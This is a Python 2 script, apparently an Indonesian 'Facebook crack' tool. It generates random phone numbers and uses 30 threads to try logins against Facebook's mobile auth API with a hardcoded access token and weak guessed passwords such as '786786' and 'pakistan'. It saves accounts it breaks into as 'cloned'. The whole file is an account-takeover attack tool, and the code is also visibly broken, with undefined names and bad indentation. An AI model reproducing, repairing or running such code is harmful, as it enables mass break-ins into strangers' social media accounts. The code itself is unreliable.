#!/usr/bin/python2
#coding=utf-8
#Jangan Di recod Juga ngentod
#Recod boleh tapi kasih nama gue Tod
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 PREMFILX2D.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
        print("Terima kasih telah menggunakan tool ini")
        (os.system.exit)

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mBlackTigerMF–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–’FM–’MF–’FM–’MF–’FM–’MF–’FM–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
ok = []
id = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

os.system("clear")
print("""\033[1;91m          MF–FM–ˆMF–MFFM FMMF–‘FM–‘MF–ˆM&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»MF
\033[1;91m          FM–‘MF–ˆFM–‘FMF MFMF–ˆMF–„FM–ˆM&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»MF
\033[1;91m          F–MF–ˆF–MFMFM–„F–MF–ˆMFMF–ˆM–FM–„F–FM–ˆFFM–ˆMFFM–ˆM–MF–„F–FM
\033[1;91m          F–ˆMF–‘MFMF–ˆF–MF–ˆMFMF–ˆF–‘F–MF–‘M–ˆMFFM–ˆMFFM–ˆF–‘F–MF–‘FM
\033[1;91m          M&F»M&F»M&F»M&F»M&F»M&F»M&F»  ╭╮╮╱▔▔▔▔╲╭╭╮╭╮╮╱▔▔▔▔╲╭╭╮╭╮╮╱▔▔▔▔╲╭╭╮
\033[1;91m          M&F»M&F¹M&F¹M&F¹M&F¹M&F¹M&F»  ╰╲╲▏▂╲╱▂▕╱╱╯╰╲╲▏▂╲╱▂▕╱╱╯╰╲╲▏▂╲╱▂▕╱╱╯
\033[1;97m          M&F»M&F¹M&F¹M&F¹M&F¹M&F¹M&F»  ┈┈╲▏▇▏▕▇▕╱┈┈┈┈╲▏▇▏▕▇▕╱┈┈┈┈╲▏▇▏▕▇▕╱┈┈
\033[1;97m          M&F»M&F¹M&F¹M&F¹M&F¹M&F¹M&F»  ┈┈╱╲▔▕▍▔╱╲┈┈┈┈╱╲▔▕▍▔╱╲┈┈┈┈╱╲▔▕▍▔╱╲┈┈
\033[1;97m          M&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»  ╭╱╱▕╋╋╋╋▏╲╲╮╭╱╱▕╋╋╋╋▏╲╲╮╭╱╱▕╋╋╋╋▏╲╲╮
\033[1;97m          M&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»  ╰╯╯┈╲▂▂╱┈╰╰╯╰╯╯┈╲▂▂╱┈╰╰╯╰╯╯┈╲▂▂╱┈╰╰╯
\033[1;97m          M&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»    INDONESIA NEGARAKU TEMPAT KELAHIRANKU
\033[1;97m 
\033[1;97m           ♡ HARI NASIONAL HARI KEMERDEKAAN INDONESIA YANG KE 76 TAHUN ♡
\033[1;97m            PEMBUAT SCRIP : MILZU-TC       SUBSCRIBE : MILZU-TC TUTORIAL77
\033[1;97m_____________________________________________________________________________________________________""")

CorrectPasscode = "MILZU&FIRDOOS"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == CorrectPasscode):
            print("\033[1;92mWELCOME TO MILZU&FIRDOOS")
            loop = 'false'
    else:
            print("\033[1;91m^-M&F-^¸WRONG")
            os.system('xdg-open https://facebook.com/profile.php?id=100071289164743 ')
#====LICENSE=====#
def lisensi():
    os.system('clear')
    logine()
#====logine=====#
def logine():
    os.system('clear')
    print("""\033[1;91m              __________      ________      ________      
\033[1;92m            /    ____   /    /   ___  \   /  ______/     ______   
\033[1;93m          /    /___/  /     /  /___/  /  /   ______/    /       \  
\033[1;94m        /    _______/      /  /\  \     /   /_____     /  /\_/\  \  
\033[1;95m      /__/                /__/  \__\   /________/     /__/     \__\  
\033[1;96m                  PREMIUM                  PREMIUM
\033[1;97m      PREMIRE                  PREMIRE                  PREMIRE""")

AmbilPasscode1 = "INDOCRACK"
AmbilPasscode2 = "AMERCRACK"
AmbilPasscode3 = "PAKICRACK"
AmbilPasscode4 = "KORECRACK"
AmbilPasscode5 = "JEPACRACK"
AmbilPasscode6 = "RUSICRACK"
AmbilPasscode7 = "CHINACRACK"
AmbilPasscode8 = "LAOSCRACK"

    print("SILAHKAN CRACK FACEBOOK NEGARA DIBAWAH INI")
    print(" 1 MULAI CRACK NEGARA ( INDONESIA )")
    print(" 2 MULAI CRACK NEGARA ( AMERICA )")
    print(" 3 MULAI CRACK NEGARA ( PAKISTAN )")
    print(" 4 MULAI CRACK NEGARA ( KOREA )")
    print(" 5 MULAI CRACK NEGARA ( JEPANG )")
    print(" 6 MULAI CRACK NEGARA ( RUSIA )")
    print(" 7 MULAI CRACK NEGARA ( CHINA )")
    print(" 8 MULAI CRACK NEGARA ( LAOS )")
    print(" 0 Exit (Coming Soon)")
    MF = raw_input("\033[1;92m[?] \x1b[1;91mKATASANDI/PASSWORD \x1b[1;95m: ")
    if MF =="":
		menu()
	elif MF == "1" or MF == "01":
		INDO()
		method()
	elif MF == "2" or MF == "02":
		AMER()
		method()
	elif MF == "3" or MF == "03":
		PAKIS()
		method()
	elif MF == "4" or MF == "04":
                KOREA()
                method()
	elif MF == "5" or MF == "05":
		JAPAN()
		method()
	elif MF == "6" or MF == "06":
		RUSIA()
		method()
	elif MF == "7" or MF == "07":
		CHINA()
		method()
	elif MF == "8" or MF == "08":
                LAOS()
                method()
        else:
		menu()

def INDO():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode1):
            print("\033[1;92mSELAMAT DATANG ORANG INDO")
            loop = 'false'
def AMER():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode2):
            print("\033[1;92mWELCOME TO AMERICA")
            loop = 'false'
def PAKIS():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode3):
            print("\033[1;92mWELCOME TO PAKISTAN")
            loop = 'false'
def KOREA():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode4):
            print("\033[1;92mWELCOME TO KOREA")
            loop = 'false'
def JAPAN():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode5):
            print("\033[1;92mWELCOME TO JAPANSE")
            loop = 'false'
def RUSIA():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode6):
            print("\033[1;92mWELCOME TO RUSSIAN")
            loop = 'false'
def CHINA():
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode7):
            print("\033[1;92mWELCOME TO CHINSE")
            loop = 'false'
def LAOS()
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == AmbilPasscode8):
            print("\033[1;92mWELCOME TO LAOS")
            loop = 'false'
def publik():
    pilih_logine()

def pilih_logine():
    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
    if peak =="":
        print("\x1b[1;95mFill In Correctly")
        pilih_premfilx()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print("""\033[1;97m               ____      ____         _____________                                              
\033[1;91m              /    \    /    \       |   ________ /                                              
\033[1;92m             /  /\  \  /  /\  \      |  |________                                                
\033[1;93m            /  /  \  \/  /  \  \     |   _______/                                                
\033[1;94m           /__/    \____/    \__\    |__|                                                        
\033[1;95m          PREMIUM  FREE  PREMIUM  FREE  PREMIUM  FREE                                            
\033[1;96m           __________  _________________       ___            __________     __________________  
\033[1;97m           |    ______/\______   ______/     /  _  \         |    ___   \    \______    ______/  
\033[1;97m           |    |_____        |  |          /  /_\  \        |   |__/   /           |  |         
\033[1;96m           |_____    |        |  |         /  _____  \       |   ____  \            |  |         
\033[1;95m           ______|   |        |  |        /  /     \  \      |  |    \  \           |  |         
\033[1;94m         /___________|        |__|       /__/       \__\     |__|     \__\          |__|         """)       

    print('\x1b[1;91m[1] M&F MULAI CRACK/Start Crack')
    time.sleep(0.05)
    print('\x1b[1;92m[0] \033[1;93m Kembali/Back')
    time.sleep(0.05)
    action()
def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print('[!] Fill In Correctly')
        action()
    elif peak =="1":              
        os.system("clear")
        print("logo2")
        print("Enter any Indonesia&Pakistan Mobile code Number"+'\n')
        print(' Enter any code 1 to 49')
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            milzumafiax()
    elif peak =='0':
        logine()
    else:
        print('[!] Fill In Correctly')
        action()
    print("50* '\033[1;91m-'")
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;93mCode you choose: '+c)
    jalan ("\033[1;95mM&F $ total 5 password will clone ^M&F-^M&F-^M&F-^M&F-^M&F-^M&F11 digit , last 7 digit, indonesia&pakistan, 000786, 786786 password Start Cracking...")
    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
    print("50* '\033[1;92m-'")
    def main(arg):
        global cp,ok
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print("'\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1  ")
                ok = open('save/cloned.txt', 'a')
                ok.write(k+c+user+pass1+'\n')
                ok.close()
                ok.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print("'\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1  ")
                    cp = open('save/cloned.txt', 'a')
                    cp.write(k+c+user+pass1+'\n')
                    cp.close()
                    cp.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print("'\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2  ")
                        ok = open('save/cloned.txt', 'a')
                        ok.write(k+c+user+pass2+'\n')
                        ok.close()
                        ok.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print("'\033[1;93m(CP) ' + k + c + user + '  |  ' + pass2  ")
                            cp = open('save/cloned.txt', 'a')
                            cp.write(k+c+user+pass2+'\n')
                            cp.close()
                            cp.append(c+user+pass2)
                        else:
                            pass3="000786"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print("'\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3  ")
                                ok = open('save/cloned.txt', 'a')
                                ok.write(k+c+user+pass3+'\n')
                                ok.close()
                                ok.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print("'\033[1;95m(CP) ' + k + c + user + '  |  ' + pass3  ")
                                    cp = open('save/cloned.txt', 'a')
                                    cp.write(k+c+user+pass3+'\n')
                                    cp.close()
                                    cp.append(c+user+pass3)
                                else:
                                    pass4="pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print("'\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4  ")
                                        ok = open('save/cloned.txt', 'a')
                                        ok.write(k+c+user+pass4+'\n')
                                        ok.close()
                                        ok.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print("'\033[1;96m(CP) ' + k + c + user + '  |  ' + pass4  ")
                                            cp = open('save/cloned.txt', 'a')
                                            cp.write(k+c+user+pass4+'\n')
                                            cp.close()
                                            cp.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print("'\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5  ")
                                                ok = open('save/cloned.txt', 'a')
                                                ok.write(k+c+user+pass5+'\n')
                                                ok.close()
                                                ok.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print("'\033[1;94m(CP) ' + k + c + user + '  |  ' + pass5  ")
                                                    cp = open('save/cloned.txt', 'a')
                                                    cp .write(k+c+user+pass5+'\n')
                                                    cp .close()
                                                    cp .append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print("50* '\033[1;91m-'")
    print('Milzu&Firdoos Process Has Been Completed^M&F-^M&F-^M&F-^M&F-M&F-M&F...100%')
    print("'Total OKAY/CHECKPOINT : '+str(len(oks))+'/'+str(len(cp)'")
    print("'Milzu&Firdoos Cloned Accounts Has Been Saved:save/cloned.txt'")
    jalan("Note : Your M&F (CP)Accounts Open after 5 to 8 days")
    print("\033[1;91mThanks \033[1;97mUseing My M&F Tool")
    print("\n\033[1;92m[\033[1;92mBack\033[1;95m]")



if __name__ == '__main__':
    logine()
